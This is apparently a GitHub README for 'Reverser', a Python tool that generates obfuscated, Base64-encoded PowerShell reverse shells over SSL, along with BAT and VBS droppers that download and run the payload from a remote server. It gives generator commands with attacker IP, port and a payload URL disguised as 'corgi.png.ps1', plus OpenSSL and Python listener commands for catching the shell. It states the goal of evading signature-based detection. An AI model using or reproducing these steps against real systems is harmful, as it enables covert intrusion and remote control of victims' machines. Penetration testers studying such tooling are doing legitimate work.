# Reverser: Reverse Shell Generator with SSL Encryption

## Overview

**Reverse** is a Python-based tool designed to generate obfuscated PowerShell scripts or batch files for establishing a reverse shell with SSL encryption. This tool can help in penetration testing scenarios where the goal is to bypass security mechanisms and establish a secure connection to a target machine.

## Features

- **Reverse Shell with SSL Encryption:** Generates PowerShell scripts that establish an encrypted reverse shell connection using SSL.
- **Obfuscation:** Each generated PowerShell script uses randomly selected variable names to avoid signature-based detection by security tools.
- **Base64 Encoding:** The PowerShell scripts are encoded in Base64 for additional obfuscation.
- **Batch File Generation:** Create a batch file that downloads and executes the encoded PowerShell script directly from a remote server.
- **VBS File Generation:** Create a VBS file that downloads and executes the encoded PowerShell script directly from a remote server.
- **Customizable:** Users can specify the IP address, port, and server URL for downloading the PowerShell script.

### Prerequisites

- Python 3.x
- OpenSSL (for certificate generation)

### Installation

Clone the repository:

```bash
git clone https://github.com/ShkudW/Reverser.git
cd Reverser
```

## Explain

The tool can generate Three types of files, as chosen by the user:
- A single PS1 file with obfuscation and Base64 encoding containing a Reverse shell payload.
- An encoded BAT file that connects to a remote server to download and Execute the encoded PS1 file.
- A VBS file that connects to a remote server to download and Execute the encoded PS1 file.

The BAT and VBS files, during their initial request to the server to download the PS1 into memory, are executed over an encrypted channel using a Self-Signed Certificate. After downloading the PS1 file into memory, the BAT and VBS files will decode the script and establish an encrypted communication channel to create the Reverse Shell


This way, we can ensure that the communication is encrypted end-to-end.

## Usage

Creating only a PS1 file (obfuscated and Based64 encoded):
```bash
python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type ps1
```
![image](https://github.com/user-attachments/assets/7e53d3e9-553a-459f-bf42-287d2c6e1606)

Creating a VBS file with the tool and transferring it to the listener's directory:
```bash
python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type vbs -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/download/photo/corgi.png.ps1>
```
![image](https://github.com/user-attachments/assets/ad71135d-a456-427c-a0e5-89bc95d0d4cf)

Creating a BAT file with the tool and transferring it to the listener's directory:
```bash
python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type bat -server https://<Your_Listener_Server_IP_For_Downloadin_PS1/download/photo/corgi.png.ps1>
```
![image](https://github.com/user-attachments/assets/91411dd0-7ef9-42d2-95c8-918fb3ba42c2)


-----------------------------

Opening The listeners:

Opening a listener with the OpenSSL server to receive the Reverse shell connection:
```bash
openssl s_server -accept <Your_PORT> -cert reception.pem -key reception.key -quiet
```
and opening a listener with our server to handle the initial connection for downloading the PS1 file from the BAT file:
```bash
python3 listener.py -https_port <Your_Listener_Server_PORT>
```


All The traffic is encrypted:
![image](https://github.com/user-attachments/assets/a2f21061-aa9c-425f-b631-0da774b01395)


Getting a Reverse Shell:
![image](https://github.com/user-attachments/assets/eb34ed8a-e98c-4fed-b01d-f2bafdc00726)





